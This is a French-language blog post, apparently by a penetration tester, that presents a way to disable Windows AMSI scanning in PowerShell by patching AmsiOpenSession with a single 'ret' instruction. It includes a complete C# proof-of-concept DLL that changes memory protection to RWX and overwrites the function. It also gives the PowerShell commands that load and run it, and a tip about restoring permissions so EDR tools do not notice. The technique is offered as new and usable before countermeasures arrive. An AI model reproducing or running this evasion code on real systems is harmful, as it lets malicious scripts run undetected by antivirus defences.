
L'__AMSI__ (AntiMalware Scan Interface) contient un ensemble de fonctions appelables par des antivirus afin de scanner un fichier. L'__AMSI__ est bien entendu utilisé par __Windows Defender__.

Lors d'un test d'intrusion interne, il arrive souvent (tout le temps) que l'on utilise les outils directement présents sur les machines compromises, comme __Powershell__ ^^.

Lorsque l'__AMSI__ est utilisé par __Windows Defender__ ou par un antivirus tiers, la DLL __amsi.dll__ est chargée en mémoire dans Powershell comme on peut le voir ci-dessous:

![image alt text](/images/bypass-amsi/amsi.png)

Si l'on exécute du code dans l'interface powershell, le code est d'abord soumis à l'analyse par l'__AMSI__ et l'on obtient généralement une erreur du type:

![image alt text](/images/bypass-amsi/amsi_error.png)

Il existe plein de moyen de bypass de l'AMSI: 

* https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell

* https://rastamouse.me/2018/10/amsiscanbuffer-bypass---part-1/

* https://0x00-0x00.github.io/research/2018/10/28/How-to-bypass-AMSI-and-Execute-ANY-malicious-powershell-code.html

Je vais vous présenter ici une méthode de bypass  un peu différente de ce qui existe déjà. Et comme personne ne me connait, elle n'est probablement pas encore diffusée publiquement. So, enjoy !! (avant que des contre-mesures ne soient prises).
Mais soyez tranquille, ce n'est vraiment pas bien compliqué.

Dans le screenshot précédent, la string "AmsiScanBuffer" a été détectée comme malveillante, car il s'agit d'une string faisant référence à une fonction de __amsi.dll__. Une signature a donc été mise en place concernant cette string afin d'éviter que cette fonction ne soit appelée...

Un bypass très simple consiste alors à modifer cette string tout en gardant son sens: concaténation. Voyez l'example ci-dessous:

![image alt text](/images/bypass-amsi/amsi_concatenate.png)

Cependant, ce n'est clairement pas le genre de bypass que je voulais évoquer ..., ni même que je souhaiterais voir dans ce blog comme un article à part entière.

Regardons plutôt ce qu'il se passe au niveau des appels API. Lorsque je debogue un processus powershell et que je met des __breakpoints__ sur les APIs de __amsi.dll__ on voit que la première fonction à être appelée est la fonction __AmsiOpenSession__ comme on peut le voir ci-dessous:

![image alt text](/images/bypass-amsi/amsi_open_session.png)

La msdn de cette fonction est: https://docs.microsoft.com/en-us/windows/win32/api/amsi/nf-amsi-amsiopensession

Il apparait évident que pour demander à __amsi.dll__ d'effectuer un scan, il faut d'abord ouvrir une session. Ainsi le scan sera actif pour une session donnée. Si le scan réussi, la fonction retourne __S_OK__, sinon, elle retourne un handle vers un code d'erreur __HRESULT__.

On voit ci-dessus que le code est très court et très simple, et que la valeur tout en bas, juste avant le __ret__  (__0x80070058__) est significative pour l'execution de cette fonction. Regardons avec IDA à quoi ressemble la fonction __AmsiOpenSession__:

![image alt text](/images/bypass-amsi/amsi_open_session_ida.png)

On y voit qu'il y a 2 résultats possibles pour __eax__: __0__ (xor eax, eax) ou __0x80070058__ (mov eax, 80070058). Lorsque __eax = 0__, tout s'est bien passé, c'est-à-dire que la session a bien été ouverte. En revanche lorsque __eax = 0x80070058__, il y a eu une erreur et la session ne s'est pas ouverte.

Si l'on patche la fonction __AmsiOpenSession__ de sorte que les instructions qu'elle execute sont:

```
B8 57 00 07 80 	mov eax, 0x80070057
C3		ret
```

On évitera alors l'exécution du code qui permet d'ouvrir une session. C'est le même principe que celui qui est évoqué dans l'un des articles que j'ai cité plus haut (qui le font sur __AmsiScanBuffer__). Cependant, l'idée est ici de ne même pas donné la possibilité au code d'ouvrir une session et de lancer un scan.

On a vu qu'il fallait forcément que __eax = 0__ pour qu'une session soit considérée comme ouverte. Si maintenant, je décide simplement de ne pas lui spécifier la valeur de __eax__ et que mon patch se résume alors:

```
C3		ret
```

On voit que le patch est bien plus petit, qu'il ne contient aucun null byte et permet de bypasser l'amsi ^^, mais également de l'insérer dans un shellcode très facilement.

Voic la DLL que j'ai codé en C# pour servir de POC: 

```
using System;
using System.Runtime.InteropServices;

public class Amsi
{
    static byte[] x64 = new byte[] { 0xC3 };
    static byte[] x86 = new byte[] { 0xC3 };

    public static void Bypass()
    {
        if (is64Bit())
            AmsiPatch(x64);
        else
            AmsiPatch(x86);
    }

    private static void AmsiPatch(byte[] patch)
    {
        try
        {
            var lib = Windows32.LoadLibrary("amsi.dll");
            var addr = Windows32.GetProcAddress(lib, "AmsiOpenSession");

            uint oldProtect;
            Windows32.VirtualProtect(addr, (UIntPtr)patch.Length, 0x40, out oldProtect);

            Marshal.Copy(patch, 0, addr, patch.Length); // AmsiOpenSession 0xc3
            
        }
        catch (Exception e)
        {
            Console.WriteLine(" [x] {0}", e.Message);
            Console.WriteLine(" [x] {0}", e.InnerException);
        }
    }

    private static bool is64Bit()
        {
            bool is64Bit = true;

            if (IntPtr.Size == 4)
                is64Bit = false;

            return is64Bit;
        }
}

class Windows32
{
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);

    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
```

Le code est extrement simple, je récupère un pointeur vers __amsi.dll__ avec __LoadLibrary()__, puis je recherche l'adresse de la fonction __AmsiOpenSession()__ que je patch avec __Copy()__.
Bien évidement il ne faut pas oublier de modifier les permissions de la zone mémoire où est située __AmsiOpenSesion()__. Elle est initialement en __RE__ (Read Execute). Il faut la passer en __RWE__ (Read Write Execute). Pour cela j'utilise la fonction __VirtualProtect()__.

A noter que l'idéal serait de remettre la bonne permission (RE) après le patch, car il y a certain __EDR__ qui vérifie les permissions régulièrement.

On voit dans le screenshot ci-dessous que le bypass fonctionne correctement. On peut alors lancer du code powershell comme bon nous semble:

![image alt text](/images/bypass-amsi/amsi_bypass.png)

Je commence par charger la DLL en mémoire:

```
PS > [System.Reflection.Assembly]::LoadFile("C:\amsi_bypass.dll")
```

Puis j'execute la fonction qui patch en mémoire __amsi.dll__:

```
PS > [Amsi]::Bypass()
```

Il faut noter que ce bypass de l'__amsi__ n'est effectif que pour le process powershell en cours. En effet à chaque process powershell __amsi.dll__ est chargée en mémoire et donc il faut de nouveau patcher. Si l'on souhaite un patch plus général, il faut alors patcher le module kernel associé ... (il faut déjà avoir les droits de tout faire sur la machine ...)

La chose qu'il est amusant de retenir, c'est que l'__AMSI__ considère que tout va bien lorsque les fonctions qu'il utilise retournent une erreur :D, ce qui est complétement absurde. Dans le doute, on considère que c'est malveillant plutôt que légitime, non? Enfin, il me semble ...

De plus, ce bypass permet d'éviter completement l'utilisation de la fonction __AmsiScanBuffer()__. On alors court-cicuite complétement le scan, ce qui est top !
